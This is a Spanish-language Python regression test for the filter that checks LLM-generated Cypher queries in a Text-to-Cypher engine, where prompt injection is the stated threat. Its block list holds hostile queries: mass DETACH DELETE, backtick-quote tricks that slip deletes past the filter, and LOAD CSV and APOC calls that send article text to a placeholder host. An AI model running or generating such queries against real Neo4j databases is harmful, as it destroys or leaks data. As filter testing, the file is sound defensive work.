"""Regresión del filtro de seguridad del motor Text-to-Cypher (`api/cypher.py`).

POR QUÉ EXISTE
--------------
El Cypher que se ejecuta contra Neo4j lo escribe un modelo, y lo que el modelo escribe depende
de una pregunta que redacta el usuario. Eso hace del motor la única superficie del sistema donde
una inyección de prompt podría intentar tocar la base. Tres barreras lo cubren (ver
arquitectura_agente.md §12); ésta ejercita la primera, que es la única que vive en nuestro código
y por lo tanto la única que un cambio nuestro puede romper en silencio.

El filtro tiene que acertar en las dos direcciones, y las dos duelen:
  - Un FALSO NEGATIVO deja pasar una consulta peligrosa.
  - Un FALSO POSITIVO descarta una consulta legítima y `consultar()` devuelve [], que es
    indistinguible de "no hay resultados". Ya pasó: un comentario del modelo que decía
    "remove duplicates" mataba la consulta entera.

Se corre a mano, sin pytest (el repo no lo usa):

    .venv/bin/python tests/test_filtro_cypher.py

Sale con código 1 si algún caso falla, así que sirve igual en un hook o en CI.
"""
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from api.cypher import MotorCypherDinamico


def bloquea(cypher: str) -> bool:
    """Reproduce la decisión de `consultar()`: normaliza y busca cláusulas prohibidas.

    No usa el motor porque no hace falta: instanciarlo abriría el driver de Neo4j y llamaría a
    un LLM. Lo que se prueba son los dos regex de clase, que son puros.
    """
    codigo = MotorCypherDinamico._PATRON_INERTE.sub(" ", cypher)
    return bool(MotorCypherDinamico._PATRON_PROHIBIDO.findall(codigo))


# Consultas que deben rechazarse. Las de escritura las frena además el servidor (execute_read),
# pero las de lectura peligrosa —CALL, LOAD, USE, SHOW— NO: no escriben, así que este filtro es
# lo único que las para.
DEBE_BLOQUEAR = [
    ("borrado directo",         "MATCH (n) DETACH DELETE n"),
    ("SET directo",             "MATCH (n) SET n.x=1 RETURN n"),
    ("MERGE",                   "MERGE (n:X {id:'a'}) RETURN n"),
    # INSERT es el alias GQL de CREATE: sintaxis válida en Neo4j 5.27, verificada con EXPLAIN.
    ("INSERT de GQL",           "INSERT (n:Prueba {x:1}) RETURN n"),
    # Evasión real: el apóstrofo dentro del backtick abría un literal falso que se tragaba el
    # DETACH DELETE al normalizar. Es sintaxis válida y borraría todos los artículos.
    ("evasión por backtick",    "MATCH (n:Articulo) WHERE n.`x'y` IS NULL DETACH DELETE n WITH 1 AS z RETURN 'z'"),
    ("evasión backtick doble",  'MATCH (n:`raro"x`) DETACH DELETE n WHERE n.y = "fin"'),
    # Exfiltración sin escribir un solo nodo: se lleva el texto del artículo en la URL.
    ("LOAD CSV exfiltrando",    "MATCH (a:Articulo) WITH a LIMIT 1 LOAD CSV FROM 'http://x/'+a.texto AS r RETURN r"),
    ("APOC de escritura",       "MATCH (n) CALL apoc.create.node(['X'],{}) YIELD node RETURN node"),
    ("APOC exfiltrando",        "CALL apoc.load.json('http://x/?d=1') YIELD value RETURN value"),
    ("USE otra base",           "USE otrabase MATCH (n) RETURN n"),
    ("SHOW indexes",            "SHOW INDEXES YIELD name RETURN name"),
    ("DROP index",              "DROP INDEX index_articulos"),
    ("minúsculas",              "match (n) detach delete n"),
    ("FOREACH con SET adentro", "MATCH (n) FOREACH (x IN [1] | SET n.a = 1) RETURN n"),
]

# Consultas legítimas que el filtro NO debe tocar. Las cuatro primeras son las que rompía antes
# de ignorar comentarios y literales; las últimas son forma real de las consultas del motor.
DEBE_PASAR = [
    ("DELETE dentro de un comentario",  "MATCH (n) RETURN n // combinar y remove duplicates"),
    ("SET dentro de un literal",        "MATCH (a:Articulo) WHERE a.texto CONTAINS 'set de documentos' RETURN a"),
    ("comentario /* */",                "/* create, delete, merge */ MATCH (a:Articulo) RETURN a.id AS id, a.texto AS texto"),
    ("literal con backtick adentro",    "MATCH (a:Articulo) WHERE a.texto CONTAINS 'el `set` social' RETURN a"),
    ("URL con // dentro de un literal", "MATCH (n:Norma) WHERE n.fuente = 'http://infoleg.gob.ar' RETURN n"),
    ("consulta real del motor",         "MATCH (norma:Norma)-[:CONTIENE]->(art:Articulo) WHERE art.vigente = true "
                                        "AND toLower(art.texto) CONTAINS 'debenture' RETURN DISTINCT art.id AS id, "
                                        "art.numero AS numero, art.texto AS texto LIMIT 5"),
    ("label entre backticks legítimo",  "MATCH (n:`Articulo`) RETURN n.id AS id, n.texto AS texto LIMIT 3"),
]


def main() -> int:
    fallos = []

    print("--- deben bloquearse ---")
    for nombre, cypher in DEBE_BLOQUEAR:
        ok = bloquea(cypher)
        if not ok:
            fallos.append(f"NO se bloqueó: {nombre}")
        print(f"  {'OK   ' if ok else 'FALLA'}  {nombre}")

    print("--- deben pasar ---")
    for nombre, cypher in DEBE_PASAR:
        ok = not bloquea(cypher)
        if not ok:
            fallos.append(f"falso positivo: {nombre}")
        print(f"  {'OK   ' if ok else 'FALLA'}  {nombre}")

    total = len(DEBE_BLOQUEAR) + len(DEBE_PASAR)
    print(f"\n{total} casos, {len(fallos)} fallos")
    for f in fallos:
        print(f"  - {f}")
    return 1 if fallos else 0


if __name__ == "__main__":
    sys.exit(main())
